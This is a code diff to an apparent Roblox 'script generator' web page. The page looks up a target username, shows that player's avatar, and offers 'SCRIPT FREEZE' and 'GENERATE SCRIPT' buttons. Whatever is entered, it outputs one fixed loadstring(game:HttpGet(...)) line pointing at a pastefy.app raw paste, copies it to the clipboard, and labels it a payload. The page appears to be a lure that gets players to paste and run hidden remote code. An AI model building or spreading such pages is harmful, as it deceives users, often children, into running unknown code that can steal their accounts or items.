@@ -11,7 +11,7 @@
         .input-dark { background: #1c1c24; border: 1px solid #2d2d39; color: white; }
         .btn-blue { background: #4f46e5; font-weight: bold; transition: 0.3s; }
         .btn-blue:disabled { background: #1c1c24; color: #444; opacity: 0.6; }
-        .avatar-glow { box-shadow: 0 0 20px rgba(79, 70, 229, 0.5); }
+        .avatar-frame { border: 2px solid #4f46e5; box-shadow: 0 0 15px rgba(79, 70, 229, 0.4); }
     </style>
 </head>
 <body class="p-4 flex justify-center min-h-screen">
@@ -30,24 +30,24 @@
 
         <div class="panel p-6 rounded-2xl space-y-4">
             <label class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Roblox Username</label>
-            <input type="text" id="userInput" oninput="updateProfile()" placeholder="Enter username..." 
+            <input type="text" id="userInput" oninput="loadAvatar()" placeholder="Enter username..." 
                    class="w-full p-4 rounded-xl input-dark text-sm outline-none focus:border-indigo-500">
             
             <div id="profileBox" class="hidden">
                 <div onclick="activateButtons()" class="flex items-center space-x-4 p-4 border border-indigo-500 bg-indigo-500/10 rounded-xl cursor-pointer hover:bg-indigo-500/20 transition-all">
-                    <div class="w-14 h-14 rounded-full bg-black border border-indigo-500/30 overflow-hidden avatar-glow">
-                        <img id="avatarImg" class="w-full h-full object-cover" src="" onerror="this.src='https://tr.rbxcdn.com/38c353b3f208112d7c58550cb53f192b/150/150/AvatarHeadshot/Png'">
+                    <div class="w-14 h-14 rounded-full bg-black overflow-hidden avatar-frame">
+                        <img id="avatarImg" class="w-full h-full object-cover" src="">
                     </div>
                     <div>
                         <p id="targetName" class="text-sm font-bold text-white"></p>
-                        <p id="statusText" class="text-[9px] text-indigo-400 font-bold uppercase tracking-widest">TAP TO CONFIRM ✅</p>
+                        <p id="statusText" class="text-[9px] text-indigo-400 font-bold uppercase">FOUND · TAP TO SELECT</p>
                     </div>
                 </div>
             </div>
         </div>
 
         <div class="space-y-3">
-            <button id="freezeBtn" disabled class="w-full p-4 rounded-xl bg-gray-800 text-[11px] font-black uppercase text-gray-500 border border-transparent">
+            <button id="freezeBtn" disabled class="w-full p-4 rounded-xl bg-gray-800 text-[11px] font-black uppercase text-gray-500">
                 SCRIPT FREEZE
             </button>
             <button id="genBtn" onclick="generate()" disabled class="w-full p-5 rounded-xl btn-blue text-[12px] font-black uppercase tracking-widest shadow-lg shadow-indigo-500/20">
@@ -56,36 +56,25 @@
         </div>
 
         <div id="output" class="hidden panel p-5 rounded-2xl border-indigo-500/30 bg-black/50 backdrop-blur">
-            <p class="text-[9px] text-indigo-500 mb-2 font-bold uppercase">SCRIPT READY:</p>
+            <p class="text-[9px] text-indigo-500 mb-2 font-bold uppercase">LOADSTRING PAYLOAD:</p>
             <code id="scriptCode" class="text-[10px] break-all text-indigo-200 font-mono"></code>
         </div>
     </div>
 
     <script>
-        async function updateProfile() {
+        function loadAvatar() {
             const user = document.getElementById('userInput').value;
             const box = document.getElementById('profileBox');
             const img = document.getElementById('avatarImg');
-            const nameLabel = document.getElementById('targetName');
+            const name = document.getElementById('targetName');
 
-            if (user.length < 3) { box.classList.add('hidden'); return; }
-
-            box.classList.remove('hidden');
-            nameLabel.textContent = user;
-
-            try {
-                // Buscamos el ID del usuario primero para obtener la imagen real
-                const response = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://www.roblox.com/search/users/results?keyword=' + user + '&maxRows=1')}`);
-                const data = await response.json();
-                const parsed = JSON.parse(data.contents);
-                
-                if (parsed.UserSearchResults && parsed.UserSearchResults.length > 0) {
-                    const userId = parsed.UserSearchResults[0].UserId;
-                    img.src = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
-                }
-            } catch (e) {
-                // Si falla, usa una imagen por defecto de alta calidad
-                img.src = `https://www.roblox.com/headshot-thumbnail/image?userName=${user}&width=150&height=150&format=png`;
+            if(user.length > 2) {
+                box.classList.remove('hidden');
+                name.textContent = user;
+                // Usamos un servicio de renderizado de avatares que no requiere API compleja
+                img.src = `https://www.roblox.com/headshot-thumbnail/image?userName=${encodeURIComponent(user)}&width=150&height=150&format=png`;
+            } else {
+                box.classList.add('hidden');
             }
         }
 
@@ -100,16 +89,10 @@
             const code = 'loadstring(game:HttpGet("https://pastefy.app/e8DClYOX/raw"))()';
             document.getElementById('scriptCode').textContent = code;
             document.getElementById('output').classList.remove('hidden');
+            document.getElementById('genBtn').textContent = "COPIED!";
             
-            // Copiar al portapapeles
-            const el = document.createElement('textarea');
-            el.value = code; document.body.appendChild(el);
-            el.select(); document.execCommand('copy');
-            document.body.removeChild(el);
-            
-            const btn = document.getElementById('genBtn');
-            btn.textContent = "COPIED!";
-            setTimeout(() => { btn.textContent = "GENERATE SCRIPT"; }, 2000);
+            navigator.clipboard.writeText(code);
+            setTimeout(() => { document.getElementById('genBtn').textContent = "GENERATE SCRIPT"; }, 2000);
         }
     </script>
 </body>
